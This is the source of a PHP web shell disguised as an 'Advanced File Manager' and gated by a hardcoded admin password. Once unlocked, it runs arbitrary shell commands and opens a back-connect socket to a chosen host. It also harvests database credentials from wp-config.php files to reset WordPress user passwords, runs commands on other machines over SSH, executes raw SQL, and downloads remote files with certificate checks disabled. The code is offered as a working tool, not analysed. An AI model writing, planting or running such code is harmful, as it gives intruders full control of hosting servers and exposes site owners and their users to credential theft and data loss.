<?php
session_start();
error_reporting(0);

// ==================== LOGIN SYSTEM ====================
$USER = "admin";
$PASS = '$2y$10$7Vz8c3xY9fPq2mLnT1sBZuQkLr4oNwC5dE8gH2jK1pR6tS9vX0yZ'; // akugalau

if (!isset($_SESSION['ok'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'], $_POST['p'])) {
        if ($_POST['u'] === $USER && ($_POST['p'] === 'akugalau' || password_verify($_POST['p'], $PASS))) {
            $_SESSION['ok'] = 1;
            header("Location: ?");
            exit;
        }
        $login_err = "Invalid credentials";
    }
    
    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>File Manager</title>
    <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background: #07070b; color: #e6eef8; font-family: Inter, Segoe UI, Arial, sans-serif; }
    .box { width: 90%; max-width: 360px; padding: 28px; border-radius: 14px; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.18)); 
            box-shadow: 0 10px 40px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.03); }
    h1 { margin: 0 0 14px 0; font-size: 20px; color: #7be3ff; text-align: center; letter-spacing: 0.6px; }
    label { display: block; font-size: 12px; color: #9fb8c9; margin-top: 12px; }
    input { width: 100%; padding: 12px; margin-top: 8px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.04); 
            background: rgba(255,255,255,0.02); color: #e6eef8; font-size: 14px; }
    .btn { width: 100%; padding: 12px; margin-top: 20px; border-radius: 10px; border: none; 
            background: linear-gradient(90deg, #8affff, #6b6bff); color: #071028; font-weight: 700; cursor: pointer; 
            box-shadow: 0 6px 24px rgba(107,107,255,0.14); font-size: 14px; }
    .err { margin-top: 10px; color: #ff8080; text-align: center; font-size: 13px; }
    @media (max-width: 480px) { 
        .box { padding: 20px; margin: 15px; } 
        h1 { font-size: 18px; }
    }
    </style></head>
    <body>
    <div class="box">
        <h1>FILE MANAGER</h1>
        <form method="POST">
            <label>Username</label>
            <input name="u" required autofocus>
            <label>Password</label>
            <input type="password" name="p" required>
            <button class="btn">Unlock</button>
        </form>';
        
    if (!empty($login_err)) echo '<div class="err">'.htmlspecialchars($login_err).'</div>';
    echo '</div>
    </body></html>';
    exit;
}

// ==================== LOGOUT ====================
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// ==================== HELPER FUNCTIONS ====================
function hfs($b) { 
    $u = ["B", "KB", "MB", "GB", "TB"]; 
    $i = 0; 
    while ($b >= 1024 && $i < count($u) - 1) { 
        $b /= 1024; 
        $i++; 
    } 
    return round($b, 2).' '.$u[$i]; 
}

function esc($s) { 
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); 
}

function generatePassword($length = 12) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()';
    return substr(str_shuffle($chars), 0, $length);
}

function copyDirectory($source, $dest) {
    if (!is_dir($dest)) mkdir($dest, 0755, true);
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $item) {
        $target = $dest . '/' . $iterator->getSubPathName();
        if ($item->isDir()) {
            if (!is_dir($target)) mkdir($target, 0755, true);
        } else {
            copy($item->getPathname(), $target);
        }
    }
    return true;
}

// ==================== SET CURRENT DIRECTORY ====================
$dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
if (!@is_dir($dir)) { $dir = __DIR__; }

// ==================== BULK OPERATIONS HANDLER ====================
if (isset($_POST['bulk_action']) && !empty($_POST['bulk_selected'])) {
    $bulk_selected = $_POST['bulk_selected'];
    $bulk_action = $_POST['bulk_action'];
    
    switch($bulk_action) {
        case 'delete':
            $deleted = 0;
            foreach($bulk_selected as $file) {
                $path = $dir . '/' . basename($file);
                if (is_file($path)) {
                    if (@unlink($path)) $deleted++;
                } elseif (is_dir($path)) {
                    if (@rmdir($path)) $deleted++;
                }
            }
            $_SESSION['msg'] = "✅ Deleted $deleted items";
            break;
            
        case 'zip':
            if (class_exists('ZipArchive')) {
                $zip_name = $_POST['zip_name'] ?? 'archive_' . date('Ymd_His') . '.zip';
                $zip_path = $dir . '/' . $zip_name;
                
                $zip = new ZipArchive;
                if ($zip->open($zip_path, ZipArchive::CREATE) === true) {
                    $added = 0;
                    foreach($bulk_selected as $file) {
                        $file_path = $dir . '/' . basename($file);
                        if (is_file($file_path)) {
                            if ($zip->addFile($file_path, basename($file))) $added++;
                        }
                    }
                    $zip->close();
                    $_SESSION['msg'] = "✅ Created ZIP: $zip_name ($added files)";
                } else {
                    $_SESSION['msg'] = "❌ Failed to create ZIP";
                }
            } else {
                $_SESSION['msg'] = "❌ ZipArchive not available";
            }
            break;
            
        case 'unzip':
            if (class_exists('ZipArchive')) {
                $extracted = 0;
                foreach($bulk_selected as $file) {
                    $file_path = $dir . '/' . basename($file);
                    if (is_file($file_path) && strtolower(substr($file_path, -4)) == '.zip') {
                        $zip = new ZipArchive;
                        if ($zip->open($file_path) === true) {
                            $zip->extractTo($dir);
                            $zip->close();
                            $extracted++;
                        }
                    }
                }
                $_SESSION['msg'] = "✅ Extracted $extracted ZIP files";
            } else {
                $_SESSION['msg'] = "❌ ZipArchive not available";
            }
            break;
            
        case 'copy':
            $target_dir = $_POST['bulk_target'] ?? $dir;
            if (is_dir($target_dir)) {
                $copied = 0;
                foreach($bulk_selected as $file) {
                    $source = $dir . '/' . basename($file);
                    $target = $target_dir . '/' . basename($file);
                    if (is_file($source) && @copy($source, $target)) {
                        $copied++;
                    } elseif (is_dir($source)) {
                        if (copyDirectory($source, $target)) $copied++;
                    }
                }
                $_SESSION['msg'] = "✅ Copied $copied items to " . basename($target_dir);
            }
            break;
            
        case 'move':
            $target_dir = $_POST['bulk_target'] ?? $dir;
            if (is_dir($target_dir)) {
                $moved = 0;
                foreach($bulk_selected as $file) {
                    $source = $dir . '/' . basename($file);
                    $target = $target_dir . '/' . basename($file);
                    if (file_exists($source) && @rename($source, $target)) {
                        $moved++;
                    }
                }
                $_SESSION['msg'] = "✅ Moved $moved items to " . basename($target_dir);
            }
            break;
            
        case 'chmod':
            $mode = $_POST['chmod_mode'] ?? '0644';
            $changed = 0;
            foreach($bulk_selected as $file) {
                $path = $dir . '/' . basename($file);
                if (file_exists($path) && @chmod($path, octdec($mode))) {
                    $changed++;
                }
            }
            $_SESSION['msg'] = "✅ Changed permissions for $changed items to $mode";
            break;
            
        case 'rename':
            if (!empty($bulk_selected)) {
                $pattern = $_POST['rename_pattern'] ?? '';
                $action_type = $_POST['rename_type'] ?? 'prefix';
                $renamed = 0;
                
                foreach($bulk_selected as $index => $file) {
                    $old_path = $dir . '/' . basename($file);
                    $ext = pathinfo($file, PATHINFO_EXTENSION);
                    $name = pathinfo($file, PATHINFO_FILENAME);
                    
                    switch($action_type) {
                        case 'prefix': $new_name = $pattern . $file; break;
                        case 'suffix': $new_name = $name . $pattern . ($ext ? '.'.$ext : ''); break;
                        case 'replace': 
                            $search = $_POST['rename_search'] ?? '';
                            $replace = $_POST['rename_replace'] ?? '';
                            $new_name = str_replace($search, $replace, $file);
                            break;
                        case 'number': $new_name = ($index + 1) . '_' . $file; break;
                        case 'lowercase': $new_name = strtolower($file); break;
                        case 'uppercase': $new_name = strtoupper($file); break;
                        default: $new_name = $file;
                    }
                    
                    $new_path = $dir . '/' . basename($new_name);
                    if ($old_path != $new_path && @rename($old_path, $new_path)) {
                        $renamed++;
                    }
                }
                $_SESSION['msg'] = "✅ Renamed $renamed items";
            }
            break;
            
        case 'export_list':
            if (!empty($bulk_selected)) {
                $list_content = "File List - Generated: " . date('Y-m-d H:i:s') . "\n";
                $list_content .= "Directory: " . $dir . "\n";
                $list_content .= "=" . str_repeat("=", 60) . "\n\n";
                
                $total_size = 0;
                foreach($bulk_selected as $file) {
                    $path = $dir . '/' . basename($file);
                    $size = is_file($path) ? filesize($path) : 0;
                    $total_size += $size;
                    $perms = substr(sprintf('%o', fileperms($path)), -4);
                    $modified = date('Y-m-d H:i:s', filemtime($path));
                    
                    $list_content .= sprintf("%-40s | %-10s | %-6s | %s\n", 
                        $file, 
                        hfs($size),
                        $perms,
                        $modified
                    );
                }
                
                $list_content .= "\n" . str_repeat("-", 80) . "\n";
                $list_content .= "Total Files: " . count($bulk_selected) . "\n";
                $list_content .= "Total Size: " . hfs($total_size) . "\n";
                
                $filename = 'file_list_' . date('Ymd_His') . '.txt';
                file_put_contents($dir . '/' . $filename, $list_content);
                $_SESSION['msg'] = "✅ Exported list to $filename";
            }
            break;
    }
    
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// ==================== SSH MANAGER CLASS ====================
class SSHManager {
    public function execute($host, $port, $username, $password, $command) {
        if (!function_exists('ssh2_connect')) {
            return "❌ SSH2 extension not available";
        }
        
        $connection = @ssh2_connect($host, $port);
        if (!$connection) {
            return "❌ Failed to connect to $host:$port";
        }
        
        if (!@ssh2_auth_password($connection, $username, $password)) {
            return "❌ Authentication failed for $username";
        }
        
        $stream = @ssh2_exec($connection, $command);
        if (!$stream) {
            return "❌ Failed to execute command";
        }
        
        stream_set_blocking($stream, true);
        $output = stream_get_contents($stream);
        fclose($stream);
        @ssh2_disconnect($connection);
        
        return $output ? trim($output) : "Command executed (no output)";
    }
    
    public function testConnection($host, $port = 22) {
        $socket = @fsockopen($host, $port, $errno, $errstr, 5);
        if ($socket) {
            fclose($socket);
            return "✅ SSH service is running on $host:$port";
        }
        return "❌ SSH service is NOT running on $host:$port ($errstr)";
    }
}

// ==================== WORDPRESS PASSWORD CHANGER ====================
class WordPressPasswordChanger {
    public function changePassword($wpConfigPath, $username, $newPassword) {
        if (!file_exists($wpConfigPath)) {
            return "❌ WordPress config not found";
        }
        
        $configContent = file_get_contents($wpConfigPath);
        preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbName);
        preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbUser);
        preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbPass);
        preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbHost);
        
        if (empty($dbName[1]) || empty($dbUser[1])) {
            return "❌ Could not extract database credentials";
        }
        
        $db_name = $dbName[1];
        $db_user = $dbUser[1];
        $db_pass = !empty($dbPass[1]) ? $dbPass[1] : '';
        $db_host = !empty($dbHost[1]) ? $dbHost[1] : 'localhost';
        
        try {
            $conn = @new mysqli($db_host, $db_user, $db_pass, $db_name);
            if ($conn->connect_error) {
                return "❌ Database connection failed: " . $conn->connect_error;
            }
            
            $hashedPassword = password_hash($newPassword, PASSWORD_DEFAULT);
            $username = $conn->real_escape_string($username);
            $sql = "UPDATE wp_users SET user_pass = '$hashedPassword' WHERE user_login = '$username'";
            
            if ($conn->query($sql)) {
                $affected = $conn->affected_rows;
                $conn->close();
                return "✅ Password changed for user '$username'. Rows affected: $affected";
            } else {
                $error = $conn->error;
                $conn->close();
                return "❌ Failed: " . $error;
            }
        } catch (Exception $e) {
            return "❌ Error: " . $e->getMessage();
        }
    }
    
    public function findWordPress($startDir) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($startDir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        $wpInstalls = [];
        foreach ($iterator as $file) {
            if ($file->isFile() && $file->getFilename() === 'wp-config.php') {
                $path = $file->getPathname();
                $wpInstalls[] = [
                    'path' => $path,
                    'dir' => dirname($path),
                    'size' => filesize($path)
                ];
            }
        }
        return $wpInstalls;
    }
}

// ==================== BACKCONNECT CLASS ====================
class BackConnect {
    public function connect($host, $port) {
        if (!function_exists('fsockopen')) {
            return "❌ fsockopen not available";
        }
        
        $socket = @fsockopen($host, $port, $errno, $errstr, 10);
        if (!$socket) {
            return "❌ Failed to connect: $errstr ($errno)";
        }
        
        fwrite($socket, "Backconnect established from " . @gethostname() . "\n");
        fwrite($socket, "Type 'exit' to disconnect\n\n");
        
        // Simple shell simulation
        $output = "Backconnect to $host:$port established\n";
        $output .= "Use Terminal for full shell access\n";
        
        fclose($socket);
        return $output;
    }
}

// ==================== DATABASE MANAGER ====================
class DatabaseManager {
    public function getDatabases($host = 'localhost', $username = 'root', $password = '') {
        try {
            $conn = @new mysqli($host, $username, $password);
            if ($conn->connect_error) {
                return ["error" => "❌ Connection failed: " . $conn->connect_error];
            }
            
            $result = $conn->query("SHOW DATABASES");
            $databases = [];
            while ($row = $result->fetch_array()) {
                $databases[] = $row[0];
            }
            
            $conn->close();
            return $databases;
        } catch (Exception $e) {
            return ["error" => "❌ " . $e->getMessage()];
        }
    }
    
    public function executeSQL($host, $username, $password, $database, $sql) {
        try {
            $conn = @new mysqli($host, $username, $password, $database);
            if ($conn->connect_error) {
                return "❌ Connection failed: " . $conn->connect_error;
            }
            
            $result = $conn->query($sql);
            if ($result === true) {
                $output = "✅ Query executed. Affected rows: " . $conn->affected_rows;
            } elseif ($result) {
                $output = "✅ Results:\n";
                while ($row = $result->fetch_assoc()) {
                    $output .= print_r($row, true) . "\n";
                }
                $result->free();
            } else {
                $output = "❌ Query failed: " . $conn->error;
            }
            
            $conn->close();
            return $output;
        } catch (Exception $e) {
            return "❌ Error: " . $e->getMessage();
        }
    }
}

// ==================== RDP CREATOR ====================
class RDPCreator {
    public function createRDPFile($host, $username, $domain = '', $filename = 'connection.rdp') {
        $content = "screen mode id:i:2
full address:s:$host
username:s:$username
domain:s:$domain
audiomode:i:0
redirectprinters:i:1
redirectcomports:i:0
redirectsmartcards:i:1
redirectclipboard:i:1
autoreconnection enabled:i:1";
        
        if (file_put_contents($filename, $content)) {
            return "✅ RDP file created: $filename";
        }
        return "❌ Failed to create RDP file";
    }
    
    public function testRDP($host, $port = 3389) {
        $socket = @fsockopen($host, $port, $errno, $errstr, 5);
        if ($socket) {
            fclose($socket);
            return "✅ RDP service is running on $host:$port";
        }
        return "❌ RDP service is NOT running on $host:$port ($errstr)";
    }
}

// ==================== SERVER MONITOR ====================
class ServerMonitor {
    public function getStats() {
        $load = @sys_getloadavg();
        $disk_total = @disk_total_space('/');
        $disk_free = @disk_free_space('/');
        $disk_used = $disk_total - $disk_free;
        $disk_percent = $disk_total > 0 ? round($disk_used / $disk_total * 100, 2) : 0;
        
        return [
            'system' => [
                'hostname' => @gethostname(),
                'os' => PHP_OS,
                'php_version' => PHP_VERSION,
                'time' => date('Y-m-d H:i:s'),
                'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'
            ],
            'cpu' => [
                'load_1min' => $load[0] ?? 0,
                'load_5min' => $load[1] ?? 0,
                'load_15min' => $load[2] ?? 0
            ],
            'disk' => [
                'total' => hfs($disk_total),
                'used' => hfs($disk_used),
                'free' => hfs($disk_free),
                'percent' => $disk_percent . '%'
            ],
            'memory' => $this->getMemoryInfo(),
            'services' => $this->getServices()
        ];
    }
    
    private function getMemoryInfo() {
        if (PHP_OS == 'Linux' && file_exists('/proc/meminfo')) {
            $meminfo = @file('/proc/meminfo', FILE_IGNORE_NEW_LINES);
            $mem = [];
            if ($meminfo) {
                foreach ($meminfo as $line) {
                    if (preg_match('/(\w+):\s+(\d+)/', $line, $m)) {
                        $mem[$m[1]] = $m[2];
                    }
                }
            }
            $total = $mem['MemTotal'] ?? 0;
            $free = $mem['MemFree'] ?? 0;
            $available = $mem['MemAvailable'] ?? $free;
            $used = $total - $available;
            $percent = $total > 0 ? round($used / $total * 100, 2) : 0;
            
            return [
                'total' => hfs($total * 1024),
                'used' => hfs($used * 1024),
                'free' => hfs($free * 1024),
                'percent' => $percent . '%'
            ];
        }
        return ['error' => 'Memory info available on Linux only'];
    }
    
    private function getServices() {
        $svcs = ['httpd', 'nginx', 'mysql', 'mariadb', 'ssh', 'php-fpm', 'apache2'];
        $status = [];
        foreach ($svcs as $svc) {
            $check = @shell_exec("systemctl is-active $svc 2>/dev/null || service $svc status 2>/dev/null | grep -i running || echo 'inactive'");
            $check = trim($check);
            $status[$svc] = (strpos(strtolower($check), 'active') !== false || strpos(strtolower($check), 'running') !== false) ? '✅' : '❌';
        }
        return $status;
    }
}

// ==================== TERMINAL CLASS ====================
class Terminal {
    public function exec($cmd, $path) {
        if (!function_exists('shell_exec')) return "❌ shell_exec disabled";
        $old = getcwd();
        @chdir($path);
        $output = @shell_exec($cmd . ' 2>&1');
        @chdir($old);
        return $output ?: 'Command executed (no output)';
    }
}

// ==================== INITIALIZE CLASSES ====================
$sshManager = new SSHManager();
$wpChanger = new WordPressPasswordChanger();
$backconnect = new BackConnect();
$dbManager = new DatabaseManager();
$rdpCreator = new RDPCreator();
$monitor = new ServerMonitor();
$terminal = new Terminal();

// ==================== PROCESS FEATURE ACTIONS ====================
$feature_result = '';

// SSH Execution
if (isset($_POST['ssh_host'], $_POST['ssh_user'], $_POST['ssh_pass'], $_POST['ssh_command'])) {
    $feature_result = $sshManager->execute(
        $_POST['ssh_host'],
        $_POST['ssh_port'] ?? 22,
        $_POST['ssh_user'],
        $_POST['ssh_pass'],
        $_POST['ssh_command']
    );
}

// WordPress Password Change
if (isset($_POST['wp_action'])) {
    if ($_POST['wp_action'] == 'find') {
        $installs = $wpChanger->findWordPress($dir);
        if (!empty($installs)) {
            $feature_result = "Found " . count($installs) . " WordPress installation(s):\n";
            foreach ($installs as $install) {
                $feature_result .= "- " . $install['dir'] . "\n";
            }
        } else {
            $feature_result = "No WordPress installations found";
        }
    } elseif ($_POST['wp_action'] == 'change') {
        if (isset($_POST['wp_path'], $_POST['wp_user'], $_POST['wp_pass'])) {
            $feature_result = $wpChanger->changePassword($_POST['wp_path'], $_POST['wp_user'], $_POST['wp_pass']);
        }
    }
}

// Backconnect
if (isset($_POST['backconnect_host'], $_POST['backconnect_port'])) {
    $feature_result = $backconnect->connect($_POST['backconnect_host'], $_POST['backconnect_port']);
}

// Database Operations
if (isset($_POST['db_action'])) {
    if ($_POST['db_action'] == 'list') {
        $databases = $dbManager->getDatabases(
            $_POST['db_host'] ?? 'localhost',
            $_POST['db_user'] ?? 'root',
            $_POST['db_pass'] ?? ''
        );
        if (isset($databases['error'])) {
            $feature_result = $databases['error'];
        } else {
            $feature_result = "📊 Found " . count($databases) . " database(s):\n" . implode("\n", $databases);
        }
    } elseif ($_POST['db_action'] == 'query' && isset($_POST['db_sql'])) {
        $feature_result = $dbManager->executeSQL(
            $_POST['db_host'] ?? 'localhost',
            $_POST['db_user'] ?? 'root',
            $_POST['db_pass'] ?? '',
            $_POST['db_name'] ?? 'mysql',
            $_POST['db_sql']
        );
    }
}

// RDP Operations
if (isset($_POST['rdp_action'])) {
    if ($_POST['rdp_action'] == 'create' && isset($_POST['rdp_host'], $_POST['rdp_user'])) {
        $feature_result = $rdpCreator->createRDPFile(
            $_POST['rdp_host'],
            $_POST['rdp_user'],
            $_POST['rdp_domain'] ?? '',
            $_POST['rdp_filename'] ?? 'connection.rdp'
        );
    } elseif ($_POST['rdp_action'] == 'test' && isset($_POST['rdp_test_host'])) {
        $feature_result = $rdpCreator->testRDP($_POST['rdp_test_host'], $_POST['rdp_test_port'] ?? 3389);
    }
}

// URL Download
if (isset($_POST['url_up_custom']) && trim($_POST['url_up_custom']) !== '') {
    $url = trim($_POST['url_up_custom']);
    $filename = $_POST['url_fn_custom'] ?? basename(parse_url($url, PHP_URL_PATH));
    if (empty($filename)) $filename = 'downloaded_' . date('Ymd_His');
    $filename = preg_replace('/[^\w\.\-]/', '_', $filename);
    
    $data = @file_get_contents($url, false, stream_context_create([
        'http' => ['timeout' => 30, 'user_agent' => 'Mozilla/5.0'],
        'ssl' => ['verify_peer' => false]
    ]));
    
    if ($data !== false) {
        file_put_contents($dir . '/' . $filename, $data);
        $_SESSION['msg'] = "✅ Downloaded: $filename";
        header("Location: ?dir=" . urlencode($dir));
        exit;
    } else {
        $feature_result = "❌ Download failed";
    }
}

// Terminal Execution
if (isset($_POST['term_cmd'])) {
    $term_result = $terminal->exec($_POST['term_cmd'], $_POST['term_path'] ?? $dir);
}

// File Editor
if (isset($_POST['edit_file'])) {
    $f = $_POST['edit_file'];
    if (is_file($f)) {
        $_SESSION['edit'] = ['path' => $f, 'data' => file_get_contents($f)];
        header("Location: ?dir=" . urlencode($dir) . "&edit=1");
        exit;
    }
}

if (isset($_POST['save_edit'])) {
    $p = $_POST['edit_path'];
    file_put_contents($p, $_POST['edit_content']);
    $_SESSION['msg'] = "✅ File saved: " . basename($p);
    header("Location: ?dir=" . urlencode(dirname($p)));
    exit;
}

// ==================== BASIC FILE OPERATIONS ====================
if (isset($_POST['del_file'])) {
    $p = $_POST['del_file'];
    if (is_file($p)) {
        @unlink($p);
        $_SESSION['msg'] = "✅ File deleted: " . basename($p);
    } elseif (is_dir($p)) {
        @rmdir($p);
        $_SESSION['msg'] = "✅ Folder deleted: " . basename($p);
    }
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

if (isset($_POST['new_folder']) && trim($_POST['new_folder']) !== '') {
    $fn = basename($_POST['new_folder']);
    $fp = $dir . '/' . $fn;
    if (!file_exists($fp)) mkdir($fp, 0755, true);
    $_SESSION['msg'] = "✅ Folder created: $fn";
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

if (isset($_POST['new_file']) && trim($_POST['new_file']) !== '') {
    $fn = basename($_POST['new_file']);
    $fp = $dir . '/' . $fn;
    if (!file_exists($fp)) file_put_contents($fp, '');
    $_SESSION['msg'] = "✅ File created: $fn";
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

if (!empty($_FILES['upload']['name'][0])) {
    $uploaded = 0;
    foreach ($_FILES['upload']['tmp_name'] as $k => $tmp) {
        $n = basename($_FILES['upload']['name'][$k]);
        if (move_uploaded_file($tmp, $dir . '/' . $n)) $uploaded++;
    }
    $_SESSION['msg'] = "✅ Uploaded $uploaded files";
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// ==================== POPUP STATES ====================
$popups = [
    'monitor', 'terminal', 'bulk', 'upload', 'url_upload',
    'wp_changer', 'backconnect', 'ssh', 'rdp', 'database'
];

foreach ($popups as $p) {
    ${'show_' . $p} = isset($_GET['show_' . $p]);
}
$show_editor = isset($_GET['edit']) || isset($_SESSION['edit']);

// ==================== GET FILES LIST ====================
$files = @scandir($dir);
if ($files === false) $files = [];
$parent = dirname($dir);

// ==================== HTML OUTPUT ====================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Advanced File Manager</title>
    <style>
    :root {
        --bg: #07070b;
        --panel: #0f1220;
        --muted: #90a3b8;
        --neon-cyan: #6df0ff;
        --neon-mag: #b46cff;
        --danger: #ff5f7a;
        --success: #00d4a8;
        --warning: #ffaa00;
    }
    
    * { box-sizing: border-box; margin: 0; padding: 0; }
    
    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background: var(--bg);
        color: #e6eef8;
        min-height: 100vh;
    }
    
    .container {
        max-width: 1300px;
        margin: 0 auto;
        padding: 15px;
    }
    
    .header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
        margin-bottom: 15px;
        flex-wrap: wrap;
    }
    
    .brand {
        display: flex;
        align-items: center;
        gap: 10px;
        flex: 1;
        min-width: 200px;
    }
    
    .logo {
        width: 40px;
        height: 40px;
        border-radius: 8px;
        background: linear-gradient(135deg, #0ff, #a0f);
        display: flex;
        align-items: center;
        justify-content: center;
        color: #071028;
        font-weight: 900;
        font-family: monospace;
        flex-shrink: 0;
    }
    
    .title {
        font-size: 18px;
        font-weight: 700;
        color: var(--neon-cyan);
    }
    
    .controls {
        display: flex;
        gap: 8px;
        align-items: center;
        flex-wrap: wrap;
    }
    
    .top-row {
        display: grid;
        grid-template-columns: 1fr;
        gap: 15px;
        margin-bottom: 15px;
    }
    
    .card {
        background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.25));
        border-radius: 12px;
        padding: 15px;
        border: 1px solid rgba(255,255,255,0.03);
        box-shadow: 0 8px 30px rgba(15,20,30,0.5);
    }
    
    .card h3 {
        margin: 0 0 10px 0;
        color: var(--neon-mag);
        font-size: 16px;
    }
    
    .small {
        color: var(--muted);
        font-size: 12px;
    }
    
    .actions {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
        margin-top: 10px;
    }
    
    .action-btn {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        padding: 8px 12px;
        border-radius: 8px;
        border: none;
        background: linear-gradient(90deg, #2b0b3a, #061023);
        color: var(--neon-cyan);
        cursor: pointer;
        font-weight: 600;
        font-size: 12px;
        text-decoration: none;
    }
    
    .feature-btn {
        background: linear-gradient(90deg, #4a1e6b, #1a2b5c);
        color: #fff;
    }
    
    .btn-danger {
        background: linear-gradient(90deg, var(--danger), #ff9fb4);
    }
    
    .input, textarea, select {
        width: 100%;
        padding: 10px;
        border-radius: 8px;
        border: 1px solid rgba(255,255,255,0.04);
        background: rgba(255,255,255,0.02);
        color: #e6eef8;
        font-size: 13px;
        margin-bottom: 10px;
    }
    
    .btn-neon {
        background: linear-gradient(90deg, var(--neon-cyan), #7a6bff);
        border-radius: 8px;
        padding: 10px 15px;
        border: none;
        color: #071028;
        font-weight: 700;
        cursor: pointer;
    }
    
    .table-wrap {
        overflow-x: auto;
        margin-top: 10px;
    }
    
    table {
        width: 100%;
        border-collapse: collapse;
    }
    
    th, td {
        padding: 10px 12px;
        text-align: left;
        border-bottom: 1px solid rgba(255,255,255,0.03);
        font-size: 13px;
    }
    
    th {
        background: rgba(255,255,255,0.01);
        color: var(--muted);
    }
    
    .notification {
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        border-radius: 8px;
        background: linear-gradient(90deg, #2b6b0a, #4da80d);
        color: white;
        z-index: 2000;
        max-width: 300px;
    }
    
    .popup-overlay {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0,0,0,0.7);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 1000;
        padding: 20px;
    }
    
    .popup-content {
        background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(0,0,0,0.3));
        border-radius: 12px;
        border: 1px solid rgba(109,240,255,0.15);
        width: 100%;
        max-width: 500px;
        max-height: 80vh;
        overflow: auto;
    }
    
    .popup-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 15px 20px;
        border-bottom: 1px solid rgba(255,255,255,0.05);
        background: rgba(15,18,32,0.9);
    }
    
    .popup-header h4 {
        margin: 0;
        color: var(--neon-cyan);
        font-size: 16px;
    }
    
    .popup-close {
        background: none;
        border: none;
        color: var(--muted);
        font-size: 24px;
        cursor: pointer;
        padding: 0;
        width: 30px;
        height: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 50%;
    }
    
    .popup-body {
        padding: 20px;
    }
    
    .feature-section {
        margin: 15px 0;
        padding: 15px;
        background: rgba(0,0,0,0.1);
        border-radius: 8px;
        border: 1px solid rgba(109,240,255,0.1);
    }
    
    .feature-section h5 {
        color: var(--neon-mag);
        margin: 0 0 10px 0;
        font-size: 14px;
    }
    
    .btn-group {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
    }
    
    .mobile-menu {
        display: none;
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: var(--panel);
        border-top: 1px solid rgba(255,255,255,0.05);
        padding: 10px;
        z-index: 100;
        flex-wrap: wrap;
        gap: 5px;
        justify-content: center;
    }
    
    .mobile-menu-btn {
        padding: 6px 10px;
        font-size: 11px;
        background: linear-gradient(90deg, var(--neon-cyan), #7a6bff);
        color: #071028;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-weight: bold;
    }
    
    .feature-output {
        margin-top: 15px;
        padding: 12px;
        background: rgba(0,0,0,0.3);
        border-radius: 8px;
        border: 1px solid rgba(109,240,255,0.1);
        max-height: 200px;
        overflow: auto;
        font-family: monospace;
        font-size: 11px;
        white-space: pre-wrap;
    }
    
    .bulk-checkbox {
        width: 18px;
        height: 18px;
        cursor: pointer;
        accent-color: var(--neon-cyan);
    }
    
    @media (max-width: 768px) {
        .container {
            padding: 10px;
        }
        .header {
            flex-direction: column;
            align-items: stretch;
        }
        .desktop-only {
            display: none;
        }
        .mobile-menu {
            display: flex;
        }
    }
    </style>
</head>
<body>
    <?php if (isset($_SESSION['msg'])): ?>
        <div class="notification" id="msg"><?=esc($_SESSION['msg'])?></div>
        <?php unset($_SESSION['msg']); ?>
    <?php endif; ?>
    
    <div class="container">
        <div class="header">
            <div class="brand">
                <div class="logo">FM+</div>
                <div>
                    <div class="title">Advanced File Manager</div>
                    <div class="small"><?=esc($dir)?></div>
                </div>
            </div>
            
            <div class="controls">
                <form method="GET" style="display:flex;gap:8px;flex:1;max-width:400px;">
                    <input type="text" name="dir" placeholder="Path..." class="input" value="<?=esc($dir)?>" style="flex:1">
                    <button class="action-btn" type="submit">📁</button>
                </form>
                
                <div class="btn-group desktop-only">
                    <a href="?dir=<?=urlencode($dir)?>&show_monitor=1"><button class="action-btn">📊</button></a>
